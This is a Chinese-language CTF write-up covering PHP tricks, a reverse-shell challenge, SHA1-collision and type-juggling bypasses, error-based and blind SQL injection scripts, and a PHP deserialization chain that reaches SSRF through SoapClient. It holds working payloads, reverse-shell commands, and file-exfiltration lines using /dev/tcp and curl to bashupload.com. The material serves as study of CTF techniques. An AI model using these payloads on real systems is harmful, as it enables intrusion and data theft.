class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fun</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;123&quot;</span>;    &#125;&#125;$dd=[<span class="hljs-keyword">new</span> aa(),<span class="hljs-string">&quot;fun&quot;</span>]();     <span class="hljs-comment">//输出 123      [&quot;aa&quot;,&quot;fun&quot;]()这样也可以</span></code></pre><p>还有就是<code>([new d(&quot;system&quot;), &quot;eval&quot;])([new d(&quot;whoami&quot;), &quot;eval&quot;])</code>这个，后面的<code>[new d(&quot;whoami&quot;), &quot;eval&quot;]</code>被当作eval的参数传进去了</p><p>看一个简单的</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">aa</span></span>&#123;    <span class="hljs-keyword">public</span> $c1;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$qq</span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;c1=$qq;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">bb</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fun</span>(<span class="hljs-params">$aadd</span>)</span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;34&quot;</span>.<span class="hljs-string">&quot;\n&quot;</span>;        var_dump($aadd);    &#125;&#125;$b=<span class="hljs-keyword">new</span> aa([<span class="hljs-keyword">new</span> bb(),<span class="hljs-string">&quot;fun&quot;</span>]([<span class="hljs-string">&quot;123&quot;</span>]));</code></pre><p>输出</p><pre><code>34array(1) &#123;[0]=&gt;string(3) &quot;123&quot;&#125;</code></pre><p>所以在一个数组中，<code>[new a(),&quot;fff&quot;]()</code>就相当于<code>new a()-&gt;ff()</code>,当然，后面的<code>()</code>里也可以加参数，如果需要的话</p><p><code>php是世界上最好的语言✔（￣︶￣）↗　</code></p><h2 id="where-is-my-FUMO"><a href="#where-is-my-FUMO" class="headerlink" title="where_is_my_FUMO"></a>where_is_my_FUMO</h2><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">chijou_kega_no_junnka</span>(<span class="hljs-params">$str</span>) </span>&#123;    $black_list = [<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;|&quot;</span>, <span class="hljs-string">&quot;&#123;&quot;</span>, <span class="hljs-string">&quot;&#125;&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot; &quot;</span>];    <span class="hljs-keyword">return</span> str_replace($black_list, <span class="hljs-string">&quot;&quot;</span>, $str);&#125;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;DATA&#x27;</span>])) &#123;    $data = $_GET[<span class="hljs-string">&#x27;DATA&#x27;</span>];    $addr = chijou_kega_no_junnka($data[<span class="hljs-string">&#x27;ADDR&#x27;</span>]);    $port = chijou_kega_no_junnka($data[<span class="hljs-string">&#x27;PORT&#x27;</span>]);    exec(<span class="hljs-string">&quot;bash -c \&quot;bash -i &lt; /dev/tcp/<span class="hljs-subst">$addr</span>/<span class="hljs-subst">$port</span>\&quot;&quot;</span>);&#125; <span class="hljs-keyword">else</span> &#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;</code></pre><p>反弹shell，但是是个无回显的shell,可以无回显shell中执行反弹shell命令，再次反弹到VPS的另一个端口</p><p><code>bash -i &gt;&amp; /dev/tcp/IP/2233 0&gt;&amp;1</code></p><p>flag在<code>/flag.png</code>中</p><p>可以这样<code>curl bashupload.com -T /flag.png</code> </p><p><code>bashupload.com</code>是一个用来传输服务器文件的网站</p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202111301202589.png"><br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202111301203952.png"></p><p>下载即可</p><ul><li>第二种方法<br>传到自己的服务器上<br><code>cat /flag.png &gt;&amp; /dev/tcp/IP/2233 0&gt;&amp;1</code></li></ul><p><code>nc -lvnp 2233 &gt; /var/flag.png</code></p><h2 id="Baby-PHP-Black-Magic-Enlightenment"><a href="#Baby-PHP-Black-Magic-Enlightenment" class="headerlink" title="Baby_PHP_Black_Magic_Enlightenment"></a>Baby_PHP_Black_Magic_Enlightenment</h2><p>第一关：</p><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;PHP is the best Language &lt;br/&gt;&quot;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Have you ever heard about PHP Black Magic&lt;br/&gt;&quot;</span>;error_reporting(<span class="hljs-number">0</span>);$temp = $_GET[<span class="hljs-string">&#x27;password&#x27;</span>];is_numeric($temp)?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no way&quot;</span>):<span class="hljs-literal">NULL</span>;    <span class="hljs-keyword">if</span>($temp&gt;<span class="hljs-number">9999</span>)&#123;    <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&#x27;./2.php&#x27;</span>);    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;How&#x27;s that possible&quot;</span>;&#125; highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-comment">//Art is long, but life is short. So I use PHP.</span><span class="hljs-comment">//I think It`s So useful that DiaoRen Said;</span><span class="hljs-comment">//why not they use their vps !!!</span><span class="hljs-comment">//BBTZ le jiarenmen</span><span class="hljs-meta">?&gt;</span></code></pre><p><code>/?password=10000a</code></p><p>第二关：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);$flag=getenv(<span class="hljs-string">&#x27;flag&#x27;</span>);<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;user&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;pass&#x27;</span>])) &#123;    <span class="hljs-keyword">if</span> ($_GET[<span class="hljs-string">&#x27;user&#x27;</span>] == $_GET[<span class="hljs-string">&#x27;pass&#x27;</span>])        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;no no no no way for you to do so.&#x27;</span>;    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sha1($_GET[<span class="hljs-string">&#x27;user&#x27;</span>]) === sha1($_GET[<span class="hljs-string">&#x27;pass&#x27;</span>]))      <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;G1ve u the flag&#x27;</span>.$flag);    <span class="hljs-keyword">else</span>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;not right&#x27;</span>;&#125;<span class="hljs-keyword">else</span>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Just g1ve it a try.&#x27;</span>;highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-meta">?&gt;</span></code></pre><p><code>/baby_magic.php?user[]=1&amp;pass[]=2</code><br>第三关：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);$flag=getenv(<span class="hljs-string">&#x27;fllag&#x27;</span>);<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;user&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;pass&#x27;</span>])) &#123;    <span class="hljs-keyword">if</span> ($_GET[<span class="hljs-string">&#x27;user&#x27;</span>] == $_GET[<span class="hljs-string">&#x27;pass&#x27;</span>])        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;no no no no way for you to do so.&#x27;</span>;    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(is_array($_GET[<span class="hljs-string">&#x27;user&#x27;</span>]) || is_array($_GET[<span class="hljs-string">&#x27;pass&#x27;</span>]))        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;There is no way you can sneak me, young man!&#x27;</span>);    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sha1($_GET[<span class="hljs-string">&#x27;user&#x27;</span>]) === sha1($_GET[<span class="hljs-string">&#x27;pass&#x27;</span>]))&#123;      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hanzo:It is impossible only the tribe of Shimada can controle the dragon&lt;br/&gt;&quot;</span>;      <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Genji:We will see again Hanzo&#x27;</span>.$flag.<span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>);    &#125;    <span class="hljs-keyword">else</span>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Wrong!&#x27;</span>;&#125;<span class="hljs-keyword">else</span>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Just G1ve it a try.&#x27;</span>;highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-meta">?&gt;</span></code></pre><p>sha1哈希碰撞</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> urllib.requestrotimi = urllib.request.urlopen(<span class="hljs-string">&quot;http://shattered.io/static/shattered-1.pdf&quot;</span>).read()[:<span class="hljs-number">500</span>];letmein = urllib.request.urlopen(<span class="hljs-string">&quot;http://shattered.io/static/shattered-2.pdf&quot;</span>).read()[:<span class="hljs-number">500</span>]; r = requests.get(<span class="hljs-string">&#x27;http://tc.rigelx.top:8003/baby_revenge.php&#x27;</span>, params=&#123;<span class="hljs-string">&#x27;user&#x27;</span>: rotimi, <span class="hljs-string">&#x27;pass&#x27;</span>: letmein&#125;);print(r.text)<span class="hljs-comment">#来自：https://www.linkedin.com/pulse/using-sha1-collision-attack-solve-bostonkeyparty-ctf-rotimi</span></code></pre><p>或者：<br>    ?user=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</p><pre><code>&amp;pass=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</code></pre><p>第四关：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$flag=getenv(<span class="hljs-string">&#x27;flllllllllag&#x27;</span>);<span class="hljs-keyword">if</span>(strstr(<span class="hljs-string">&quot;Longlone&quot;</span>,$_GET[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;  <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;no no no!&lt;br&gt;&quot;</span>);  <span class="hljs-keyword">exit</span>();&#125;$_GET[<span class="hljs-string">&#x27;id&#x27;</span>] = urldecode($_GET[<span class="hljs-string">&#x27;id&#x27;</span>]);<span class="hljs-keyword">if</span>($_GET[<span class="hljs-string">&#x27;id&#x27;</span>] === <span class="hljs-string">&quot;Longlone&quot;</span>)&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag: <span class="hljs-subst">$flag</span>&quot;</span>;&#125;highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-meta">?&gt;</span></code></pre><p>url编码脚本</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$string = <span class="hljs-string">&#x27;Longlone&#x27;</span>; <span class="hljs-comment">//需要二次编码的字符或字符串</span>$result = <span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($string);$i++)&#123;    $char = $string[$i];    <span class="hljs-keyword">for</span> ($ascii1 = <span class="hljs-number">0</span>; $ascii1 &lt; <span class="hljs-number">256</span>; $ascii1++) &#123;        <span class="hljs-keyword">for</span> ($ascii2 = <span class="hljs-number">0</span>; $ascii2 &lt; <span class="hljs-number">256</span>; $ascii2++) &#123;            $aaa = <span class="hljs-string">&#x27;%&#x27;</span>.$ascii1.<span class="hljs-string">&#x27;%&#x27;</span>.$ascii2;            <span class="hljs-keyword">if</span>(urldecode(urldecode($aaa)) == $char)&#123;                <span class="hljs-keyword">echo</span> $char.<span class="hljs-string">&#x27;: &#x27;</span>.$aaa;                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;                $result = $result.$aaa;                <span class="hljs-keyword">break</span> <span class="hljs-number">2</span>;            &#125;        &#125;    &#125;&#125;<span class="hljs-keyword">echo</span> $result;<span class="hljs-meta">?&gt;</span></code></pre><p>payload:<code>?id=%4%43%6%46%6%45%6%37%6%43%6%46%6%45%6%35</code></p><h2 id="anothersql"><a href="#anothersql" class="headerlink" title="anothersql"></a>anothersql</h2><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202111302157152.png"><br><code>floor报错注入</code><br>payload:<br>注库：<code>-1&#39; union select 1,2,3,4 from (select count(*),concat(floor(rand(0)*2),(select concat(&#39;#&#39;,right((SELECT group_concat(schema_name) from information_schema.schemata),60))))a from information_schema.tables group by a)b#</code></p><pre><code>&lt;script&gt;alert(&quot;Duplicate entry &#39;1#a,fffaaakkkeeeflag,mysql,performance_schema,sys,true____flag&#39; for key &#39;&lt;group_key&gt;&#39;&quot;);parent.location.href=&quot;index.php&quot;;&lt;/script&gt;</code></pre><p>注表：<code>-1&#39; union select 1,2,3,4 from (select count(*),concat(floor(rand(0)*2),(select concat(&#39;#&#39;,right((SELECT group_concat(table_name) from information_schema.tables where table_schema=&#39;true____flag&#39;),60))))a from information_schema.tables group by a)b#</code></p><pre><code>&lt;script&gt;alert(&quot;Duplicate entry &#39;1#syclover&#39; for key &#39;&lt;group_key&gt;&#39;&quot;);parent.location.href=&quot;index.php&quot;;&lt;/script&gt;</code></pre><p>注列：<code>-1&#39; union select 1,2,3,4 from (select count(*),concat(floor(rand(0)*2),(select concat(&#39;#&#39;,right((SELECT group_concat(column_name) from information_schema.columns where table_name=&#39;syclover&#39;),60))))a from information_schema.tables group by a)b#</code></p><pre><code>&lt;script&gt;alert(&quot;Duplicate entry &#39;1#id,uname,pwd,flag&#39; for key &#39;&lt;group_key&gt;&#39;&quot;);parent.location.href=&quot;index.php&quot;;&lt;/script&gt;</code></pre><p>flag:<code>-1&#39; union select 1,2,3,4 from (select count(*),concat(floor(rand(0)*2),(select concat(&#39;#&#39;,right((SELECT group_concat(flag) from true____flag.syclover),60))))a from information_schema.tables group by a)b#</code></p><pre><code>&lt;script&gt;alert(&quot;Duplicate entry &#39;1#SYC&#123;U_4N0vv_3rR0r_Inj3c410n&#125;&#39; for key &#39;&lt;group_key&gt;&#39;&quot;);parent.location.href=&quot;index.php&quot;;&lt;/script&gt;</code></pre><p><code>right函数</code></p><pre><code>mysql&gt; SELECT RIGHT(&#39;MySQL&#39;,3);+------------------+| RIGHT(&#39;MySQL&#39;,3) |+------------------+| SQL              |+------------------+1 row in set (0.00 sec)</code></pre><p><code>left函数</code></p><pre><code>mysql&gt; SELECT LEFT(&#39;MySQL LEFT&#39;, 5);+-----------------------+| LEFT(&#39;MySQL LEFT&#39;, 5) |+-----------------------+| MySQL                 |+-----------------------+1 row in set</code></pre><p><code>mid函数</code>—–和substr差不多</p><pre><code>mysql&gt; select mid(&#39;adbdab&#39;,3,2);+-------------------+| mid(&#39;adbdab&#39;,3,2) |+-------------------+| bd                |+-------------------+1 row in set (0.01 sec)</code></pre><p>substr被过了就用上面三个代替</p><h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><p>bool盲注</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> stringurl=<span class="hljs-string">&#x27;http://47.100.242.70:4725/check.php&#x27;</span>strr=string.printableres=<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">40</span>):    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> strr:        <span class="hljs-comment">#payload=&quot;admi&#x27;or(mid(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;)=&#x27;1&quot;.format(i,s)</span>        <span class="hljs-comment">#payload=&quot;admi&#x27;or(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;easysql&#x27;)),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;)=&#x27;1&quot;.format(i,s)</span>        <span class="hljs-comment">#payload=&quot;admi&#x27;or(mid((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;syclover&#x27;)),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;)=&#x27;1&quot;.format(i,s)</span>        payload=<span class="hljs-string">&quot;admi&#x27;or(mid((select(group_concat(pwd))from(easysql.syclover)),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;)=&#x27;1&quot;</span>.<span class="hljs-built_in">format</span>(i,s)        <span class="hljs-comment">#print(payload)</span>        data=&#123;<span class="hljs-string">&quot;uname&quot;</span>:payload,<span class="hljs-string">&quot;pwd&quot;</span>:<span class="hljs-string">&quot;adm&quot;</span>,<span class="hljs-string">&quot;wp-submit&quot;</span>:<span class="hljs-string">&quot;%E7%99%BB%E5%BD%95&quot;</span>&#125;        r=requests.post(url,data)        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;wrong password&#x27;</span> <span class="hljs-keyword">in</span> r.text:            res+=s            print(res)            <span class="hljs-keyword">break</span></code></pre><p>空格过了用<code>()</code>,<code>substr</code>被过用<code>mid</code></p><h2 id="SoEzUnser"><a href="#SoEzUnser" class="headerlink" title="SoEzUnser"></a>SoEzUnser</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">fxxk</span></span>&#123;    <span class="hljs-keyword">public</span> $par0;    <span class="hljs-keyword">public</span> $par1;    <span class="hljs-keyword">public</span> $par2;    <span class="hljs-keyword">public</span> $par3;    <span class="hljs-keyword">public</span> $kelasi;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$par0,$par1,$par2,$par3</span>)</span>&#123;        <span class="hljs-keyword">$this</span> -&gt; par0 = $par0;        <span class="hljs-keyword">$this</span> -&gt; par1 = $par1;        <span class="hljs-keyword">$this</span> -&gt; par2 = $par2;        <span class="hljs-keyword">$this</span> -&gt; par3 = $par3;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">newOne</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">$this</span> -&gt; kelasi = <span class="hljs-keyword">new</span> <span class="hljs-keyword">$this</span> -&gt; par0(<span class="hljs-keyword">$this</span> -&gt; par1,<span class="hljs-keyword">$this</span> -&gt; par2);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">wuhu</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;syclover    !&#x27;</span>.<span class="hljs-keyword">$this</span> -&gt; kelasi.<span class="hljs-string">&#x27;     yyds&#x27;</span>);    &#125;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">qifei</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-comment">//$ser = serialize($this -&gt; kelasi);</span>        <span class="hljs-comment">//$unser = unserialize($ser);</span>        <span class="hljs-keyword">$this</span> -&gt; kelasi -&gt; juts_a_function();    &#125;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span> -&gt; par0) &amp;&amp; (<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span> -&gt; par1) || <span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span> -&gt; par2)))&#123;            <span class="hljs-keyword">$this</span> -&gt; newOne();            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span> -&gt; par3 == <span class="hljs-string">&#x27;unser&#x27;</span>)&#123;                <span class="hljs-keyword">$this</span> -&gt; qifei();            &#125;            <span class="hljs-keyword">else</span>&#123;                <span class="hljs-keyword">$this</span> -&gt; wuhu();            &#125;        &#125;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;        @<span class="hljs-keyword">include_once</span>(<span class="hljs-keyword">$this</span> -&gt; par2.<span class="hljs-string">&#x27;hint.php&#x27;</span>);    &#125;&#125;highlight_file(<span class="hljs-keyword">__FILE__</span>);$hack = $_GET[<span class="hljs-string">&#x27;hack&#x27;</span>];unserialize($hack);</code></pre><p>首先<code>__wakeup</code>里用伪协议读取<code>hint.php</code></p><p><code>$this-&gt;par2=php://filter/read=convert.base64-encode/resource=./</code></p><p><code>hint.php</code> </p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$hint = <span class="hljs-string">&#x27;向管理员的页面post一个参数message(告诉他，&quot;iwantflag&quot;) 和 另一个参数 url（它会向这个url发送一个flag&#x27;</span>;$hint .= <span class="hljs-string">&#x27;管理员的页面在当前目录下一个特殊文件夹里&#x27;</span>;$hint .= <span class="hljs-string">&#x27;但是我不知道（你也猜不到的）文件夹名称和管理员页面的名称，更坏的消息是只能从127.0.0.1去访问，你能想个办法去看看（别扫 扫不出来!!!)&#x27;</span>;</code></pre><p>通过<code>newOne()</code>使用原生类<code>FilesystemIterator</code>读取目录</p><p>读取两次</p><p><code>/aaaaaaaaaaafxadwagaefae/UcantGuess.php</code></p><p>然后<br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112012339716.png"><br>这个只能读一行，只有个<code>&lt;?php</code></p><p>接下来<code>SoapClient打SSRF</code></p><p>官方exp:</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">fxxk</span></span>&#123;<span class="hljs-keyword">public</span> $par0;<span class="hljs-keyword">public</span> $par1;<span class="hljs-keyword">public</span> $kelasi;<span class="hljs-keyword">public</span> $par2;<span class="hljs-keyword">public</span> $par3;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$name,$par1,$par2,$par3</span>)</span>&#123;<span class="hljs-keyword">$this</span> -&gt; par0 = $name;<span class="hljs-keyword">$this</span> -&gt; par1 = $par1;<span class="hljs-keyword">$this</span> -&gt; par2 = $par2;<span class="hljs-keyword">$this</span> -&gt; par3 = $par3;&#125;&#125;$postdata = <span class="hljs-string">&#x27;message=iwantflag&amp;url=http://vps:9999&#x27;</span>;<span class="hljs-comment">//按要求设置post数据</span>$url = <span class="hljs-string">&#x27;http://127.0.0.1/unserbucket/aaaaaaaaaaafxadwagaefae/UcantGuess.php&#x27;</span>;<span class="hljs-comment">//payload1 = new fxxk(&#x27;&#x27;,&#x27;&#x27;,&#x27;php://filter/read=convert.base64-encode/resource=./&#x27;,&#x27;&#x27;);#伪协议读hint</span><span class="hljs-comment">//payload2 = new fxxk(&#x27;FilesystemIterator&#x27;,&#x27;./&#x27;,1,&#x27;echoo&#x27;);#列目录</span><span class="hljs-comment">//payload3 = new fxxk(&#x27;FilesystemIterator&#x27;,&#x27;./aaaaaaaaaaafxadwagaefae&#x27;,1,&#x27;echoo&#x27;);#列目录</span>$payload4 = <span class="hljs-keyword">new</span> fxxk(<span class="hljs-string">&#x27;SoapClient&#x27;</span>,<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; $url,<span class="hljs-string">&#x27;user_agent&#x27;</span> =&gt;<span class="hljs-string">&#x27;wupco&#x27;</span>.<span class="hljs-string">&#x27;!!&#x27;</span>.<span class="hljs-string">&#x27;Content-Type:&#x27;</span>.<span class="hljs-string">&#x27;Application/X-WWW-Form-Urlencoded&#x27;</span>.<span class="hljs-string">&#x27;!!&#x27;</span>.<span class="hljs-string">&#x27;Content-Length:&#x27;</span>.(<span class="hljs-keyword">string</span>)strlen($postdata).<span class="hljs-string">&#x27;!!!!&#x27;</span>.$postdata.<span class="hljs-string">&#x27;!!&#x27;</span>,<span class="hljs-string">&#x27;uri&#x27;</span> =&gt;<span class="hljs-string">&#x27;baaa&#x27;</span>),<span class="hljs-string">&#x27;unser&#x27;</span>);$soa = str_replace(<span class="hljs-string">&#x27;!!&#x27;</span>,<span class="hljs-string">&quot;\r\n&quot;</span>,serialize($payload4));<span class="hljs-keyword">echo</span>(urlencode($soa));</code></pre><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112012348807.png"></p><h2 id="validation"><a href="#validation" class="headerlink" title="validation"></a>validation</h2><p>验证码ocr</p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112020019531.png"></p><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<span class="hljs-keyword">import</span> time<span class="hljs-keyword">import</span> re<span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<span class="hljs-keyword">import</span> ddddocr<span class="hljs-keyword">import</span> onnxruntime<span class="hljs-keyword">import</span> requests<span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decodeurl = <span class="hljs-string">&quot;http://110.42.233.91:88/access&quot;</span>sess = requests.Session()ocr = ddddocr.DdddOcr(use_gpu=<span class="hljs-literal">True</span>)onnxruntime.set_default_logger_severity(<span class="hljs-number">3</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pic_to_text</span>(<span class="hljs-params">text</span>):</span>    img = re.findall(<span class="hljs-string">r&quot;base64,(.*?)&gt;&quot;</span>, text)[<span class="hljs-number">0</span>]    <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;v_code_LA.png&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>).write(b64decode(img.encode()))    v_code = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;v_code_LA.png&quot;</span>)    v_code.convert(<span class="hljs-string">&quot;L&quot;</span>)    v_code.save(<span class="hljs-string">&quot;v_code.png&quot;</span>)    v_code_bytes = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;v_code.png&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()    code = ocr.classification(v_code_bytes)    os.remove(<span class="hljs-string">&quot;v_code.png&quot;</span>)    <span class="hljs-keyword">return</span> code.lower()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">validate</span>(<span class="hljs-params">text</span>):</span>    cnt = <span class="hljs-built_in">int</span>(re.findall(<span class="hljs-string">r&quot;done (.*?) times&quot;</span>, text)[<span class="hljs-number">0</span>])    <span class="hljs-keyword">if</span> cnt == <span class="hljs-number">1000</span>:        print(text)        <span class="hljs-keyword">return</span>    code = pic_to_text(text)    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(code) != <span class="hljs-number">4</span>:        <span class="hljs-keyword">return</span>    data = &#123;        <span class="hljs-string">&quot;v_code&quot;</span>: code    &#125;    sess.post(url, data)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:        res = sess.get(url)        validate(res.text)        time.sleep(<span class="hljs-number">2</span>)</code></pre><p>不过这个脚本运行报错，等之后看看吧</p>]]></content>
    
    
      
      
